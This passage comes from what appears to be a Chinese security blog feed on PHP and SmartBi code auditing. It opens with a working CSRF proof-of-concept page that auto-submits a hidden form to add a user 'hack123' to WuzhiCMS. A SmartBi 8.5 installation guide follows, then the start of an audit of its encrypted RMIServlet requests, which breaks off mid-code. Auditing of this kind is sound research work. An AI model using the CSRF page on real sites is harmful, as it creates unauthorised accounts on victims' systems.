class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">html</span><span style="color: #ABB2BF">&gt;&lt;</span><span style="color: #E06C75">body</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">type</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;text/javascript&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">post</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75; font-style: italic">url</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75; font-style: italic">fields</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #C678DD">var</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">document</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">createElement</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;form&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">p</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">action</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">p</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">innerHTML</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">fields</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">p</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">target</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;_self&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">p</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">method</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;post&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">document</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">body</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">appendChild</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">p</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">submit</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">csrf_hack</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #C678DD">var</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">fields</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;info[username]&#39; value=&#39;hack123&#39; /&gt;&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;info[password]&#39; value=&#39;hacktest&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;info[pwdconfirm]&#39; value=&#39;hacktest&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;info[email]&#39; value=&#39;taoge@5ecurity.cn&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;info[mobile]&#39; value=&#39;&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;modelids[]&#39; value=&#39;10&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;info[groupid]&#39; value=&#39;3&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;pids[]&#39; value=&#39;0&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;pids[]&#39; value=&#39;0&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;pids[]&#39; value=&#39;0&#39; /&gt;&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;pids[]&#39; value=&#39;0&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;avatar&#39; value=&#39;&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;islock&#39; value=&#39;0&#39; /&gt;&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;sys_name&#39; value=&#39;0&#39; /&gt;&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;info[birthday]&#39; value=&#39;&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;info[truename]&#39; value=&#39;&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;info[sex]&#39; value=&#39;0&#39; /&gt;&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;info[marriage]&#39; value=&#39;0&#39; /&gt;&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">var</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">url</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;http://127.0.0.1/www/index.php?m=member&amp;f=index&amp;v=add&amp;_su=wuzhicms&amp;_menuid=30&amp;_submenuid=74&amp;submit=提交&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #61AFEF">post</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">fields</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #E5C07B">window</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">onload</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF">() { </span><span style="color: #61AFEF">csrf_hack</span><span style="color: #ABB2BF">();}</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">body</span><span style="color: #ABB2BF">&gt;&lt;/</span><span style="color: #E06C75">html</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SmartBi-8.5搭建&amp;&amp;审计</title>
    <link href="/2025/10/27/SmartBi-8.5%E6%90%AD%E5%BB%BA&amp;&amp;%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/10/27/SmartBi-8.5%E6%90%AD%E5%BB%BA&amp;&amp;%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="SmartBi-8-5搭建"><a href="#SmartBi-8-5搭建" class="headerlink" title="SmartBi-8.5搭建"></a>SmartBi-8.5搭建</h1><h2 id="一、下载"><a href="#一、下载" class="headerlink" title="一、下载"></a>一、下载</h2><p>通过网盘分享的文件：SmartBi-8.5环境.zip<br>链接: <a href="https://pan.baidu.com/s/1bFYYEI9-g84IeLG_HoZlxA">https://pan.baidu.com/s/1bFYYEI9-g84IeLG_HoZlxA</a> 提取码: hqb4</p><h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173227241.png" alt="image-20250821000100076"></p><p> 用户名和公司名称随意 </p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173344611.png" alt="image-20250821000110498"></p><p>更改安装目录 </p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173349208.png" alt="image-20250821000121312"></p><p>此处，不要选择“安装演示库”，否则会报“报表数量超过限制”的错误</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173227245.png" alt="image-20250821000144553"></p><p>不选择“注册为Windows服务”，内存大小默认即可</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173357836.png" alt="image-20250821000156009"></p><p> 登录首页的密码 </p><h2 id="三、license获取"><a href="#三、license获取" class="headerlink" title="三、license获取"></a>三、license获取</h2><p>  官网地址：<a href="https://www.smartbi.com.cn/">https://www.smartbi.com.cn/</a> </p><p>license申请地址：<a href="https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html">https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html</a> </p><p>这里第一次进入需要注册\登录：</p><p>之后便可以申请了，邮箱要填正确，之后会将 license 发到邮箱里</p><p>选择个人版</p><p>之后在邮箱里可以看到发的：Smartbi-License.xml </p><p>获取 licence 后，将其放置在 E:\Smartbi\Tomcat\bin 文件夹 下</p><h2 id="四、创建数据库"><a href="#四、创建数据库" class="headerlink" title="四、创建数据库"></a>四、创建数据库</h2><p>首先连接 Smartbi ：</p><p>创建 Smartbi 数据库： </p><p>第一步连接好之后，是没有 smartbi 数据库的，需要自己创建  </p><p>下面是 MySQL 的配置： database-name 在选择安装“演示数据库”时是： smartbidemo ；咋们没有选择，所以默认是： smartbi</p><p>E:\Smartbi\Tomcat\bin\smartbi-config.xml </p><ul><li><p>解决浏览器版本误判  </p><p>这一步可以看下面问题中的 1、</p></li></ul><h2 id="五、启动程序"><a href="#五、启动程序" class="headerlink" title="五、启动程序"></a>五、启动程序</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>E:\Smartbi\Tomcat\bin\startup.cmd </p><p>运行 startup.cmd ，启动服务器  </p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>系统开始菜单中找到 Smartbi 的安装目录，单击启动Smartbi服务</p><p>没有报错的话，就是启动成功了， 若到这一步服务启动有错，重启电脑！！！</p><h2 id="六、配置程序"><a href="#六、配置程序" class="headerlink" title="六、配置程序"></a>六、配置程序</h2><p>访问Smartbi:首次访问，需输入密码，这里的密码随意，我的是 admin</p><p> 接下来的配置按照图中所示即可：</p><h2 id="七、进入主页"><a href="#七、进入主页" class="headerlink" title="七、进入主页"></a>七、进入主页</h2><p>  重启服务后，再次点击 访问Smartbi ，会进入下方页面：</p><p><a href="http://localhost:18080/smartbi/vision/index.jsp">http://localhost:18080/smartbi/vision/index.jsp</a> </p><p>首次访问登录页：</p><p> 此处的旧密码是 manager ，之后自行修改一个新密码：</p><p> 这是之后访问登录页：登录系统：</p><p>  至此，Smartbi v8.5 环境搭建完成。</p><h2 id="所遇问题"><a href="#所遇问题" class="headerlink" title="所遇问题"></a>所遇问题</h2><p>（按照上述方法安装后应该 不会有下列问题）： </p><h3 id="1、浏览器版本被错误检测"><a href="#1、浏览器版本被错误检测" class="headerlink" title="1、浏览器版本被错误检测"></a>1、浏览器版本被错误检测</h3><p>参考：<a href="https://www.xiaoheiwoo.com/windows-11-internet-explorer/">https://www.xiaoheiwoo.com/windows-11-internet-explorer/</a> </p><p>方法一：</p><p>从“管理加载项”窗口打开 Internet Explorer </p><p>IE中是可以通过 Internet属性 窗口，对浏览器进行功能设置的。</p><p>虽然 Win11默认找不到 IE的入口，但是 Internet属性 程序依然可以正常运行，我们可以点击其中的 管 理加载项 功能，打开 IE 浏览器。</p><p> 步骤：</p><ol><li><p>首先，按 Win + R 打开运行窗口</p></li><li><p>接下来，在运行命令框中输入 inetcpl.cpl </p></li><li><p>单击 确定 进入 Internet 属性窗口</p></li><li><p>选择 程序 选项卡，点击 管理加载项 按钮</p></li><li><p>然后，点击窗口底部 了解有关工具栏和扩展的详细信息</p></li><li><p>铛铛铛，你要的 IE浏览器出现啦~</p></li></ol><p>方法二：注释掉判断语句</p><p>进入 E:\Smartbi\Tomcat\webapps\smartbi\vision </p><p>找到文件 config.jsp </p><p>将判断部分注释掉  </p><h3 id="2、报表数量超过限制"><a href="#2、报表数量超过限制" class="headerlink" title="2、报表数量超过限制"></a>2、报表数量超过限制</h3><p>报这个问题是由于安装时选择了安装 演示数据库 ，不安装即可。</p><h3 id="3、配置完成后无法正确访问到登陆页面，一直重定向到配-置页"><a href="#3、配置完成后无法正确访问到登陆页面，一直重定向到配-置页" class="headerlink" title="3、配置完成后无法正确访问到登陆页面，一直重定向到配 置页"></a>3、配置完成后无法正确访问到登陆页面，一直重定向到配 置页</h3><p>问题： </p><p>如图，知识库连接成功，license上传成功。重启后访问 <a href="http://localhost:18080/smartbi">http://localhost:18080/smartbi</a> 仍然跳转到配 置页面 <a href="http://localhost:18080/smartbi/vision/config.jsp%E3%80%82">http://localhost:18080/smartbi/vision/config.jsp。</a></p><p> 配置完成后再次登录，显示服务启动不成功： </p><p> 数据库正常连接：</p><p> <strong>正常访问跳转的页面：</strong></p><p><a href="http://localhost:18080/smartbi/vision/index.jsp">http://localhost:18080/smartbi/vision/index.jsp</a> </p><p><a href="http://localhost:18080/smartbi/vision">http://localhost:18080/smartbi/vision</a> </p><p><a href="http://localhost:18080/smartbi">http://localhost:18080/smartbi</a> </p><p>都会重定向到 <a href="http://localhost:18080/smartbi/vision/config.jsp">http://localhost:18080/smartbi/vision/config.jsp</a>   </p><p>修改：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">//var chromeVer = ua.substr(chrome + 7,2);</span></span><span class="line"><span style="color: #abb2bf">-&gt;</span></span><span class="line"><span style="color: #abb2bf">var match = ua.match(/chrome\/(\d+)/i);</span></span><span class="line"><span style="color: #abb2bf">var chromeVer = match ? parseInt(match[1]) : 0;</span></span></code></pre></div></div></figure><p>能正确识别浏览器版本，但没什么用 </p><h1 id="smartbi审计："><a href="#smartbi审计：" class="headerlink" title="smartbi审计："></a><strong>smartbi</strong>审计：</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>SmartBI 是广州思迈特软件有限公司旗下的商业智能 BI 和数据分析品牌，是一款企业级大数据分析软件，能快速挖掘企业数据价值。集合<strong>数据可视化</strong>，<strong>探索性分析</strong>，<strong>自助式仪表盘</strong>以及<strong>一站式 ABI 平台</strong>，<strong>智慧数据运营平台</strong>，<strong>电子表格软件</strong>等等</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>版本：SmartBi V8.5         JDK 8</p><p>传参方式（直接传输，RMIServlet加密）</p><p><strong>RMIServlet加密</strong>、</p><p>先抓包，抓到的get，放行之后会出现post（smartbi程调用入口，是SmartBI 用自己的协议封装 HTTP 请求，把请求体加密后发给 RMIServlet）</p><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/smartbi/vision/RMIServlet</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span><span class="line"><span style="color: #61AFEF">Host:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">192.168</span><span style="color: #98C379">.1.8:18080</span></span><span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Windows </span><span style="color: #98C379">NT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Win64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">x64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">rv:136.0</span><span style="color: #ABB2BF">) Gecko/20100101 Firefox/136.0</span></span><span class="line"><span style="color: #61AFEF">Accept:</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">/</span><span style="color: #E5C07B">*</span></span><span class="line"><span style="color: #61AFEF">Accept-Language:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">zh-CN,zh</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span><span style="color: #98C379">,zh-TW</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.7</span><span style="color: #98C379">,zh-HK</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.5</span><span style="color: #98C379">,en-US</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.3</span><span style="color: #98C379">,en</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.2</span></span><span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">deflate,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">br</span></span><span class="line"><span style="color: #61AFEF">If-Modified-Since:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span><span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">application/x-www-form-urlencoded</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">charset</span><span style="color: #56B6C2">=</span><span style="color: #98C379">UTF-8</span></span><span class="line"><span style="color: #61AFEF">Content-Length:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">69</span></span><span class="line"><span style="color: #61AFEF">Origin:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://192.168.1.8:18080</span></span><span class="line"><span style="color: #61AFEF">Connection:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">keep-alive</span></span><span class="line"><span style="color: #61AFEF">Referer:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://192.168.1.8:18080/smartbi/vision/index.jsp</span></span><span class="line"><span style="color: #61AFEF">Cookie:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">JSESSIONID=FA004C807237DA15E8841C4E8D2C02BF</span></span><span class="line"><span style="color: #61AFEF">Priority:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">u=</span><span style="color: #D19A66">0</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">encode</span><span style="color: #56B6C2">=</span><span style="color: #98C379">zDp4Wp4gRip+iIpiGZp4DRw6+/JV/uuu71&#39;f11fuu/u7uu/NOuu/NO1m/uu/JT</span></span></code></pre></div></div></figure><ol><li><p>追踪，RMIServlet加密的解密流程在 TraceFilter 的 doFilter ⽅法</p><p>（用 <strong>F12</strong> → Network → 点击这个 RMIServlet 请求 → 在 <strong>Initiator</strong> 或 <strong>调用栈</strong> 里看哪个 JS 文件生成了 <code>encode</code>）</p><p>Smartbi\Tomcat\bin\exts-smartbi\smartbiExtension4478727347500549277.tmp\META-INF\classes\smartbix\smartbi\filter\SmartbiXTraceFilter.class</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">SmartbiXTraceFilter</span><span style="color: #E06C75"> </span><span style="color: #C678DD">extends</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">TraceFilter</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> doFilter</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">request</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">ServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">FilterChain</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">chain</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">boolean</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">hasStartup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">FreeQueryModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">FreeQueryModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getFramework</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">            hasStartup </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">FreeQueryModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getFramework</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">isServerStartupSucceed</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (request </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> HttpServletRequest </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> response </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> HttpServletResponse </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> hasStartup) {</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">SessionLogService</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getMlogs</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">size</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">SessionLogService</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getUlogs</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">size</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(request, response);</span></span><span class="line"><span 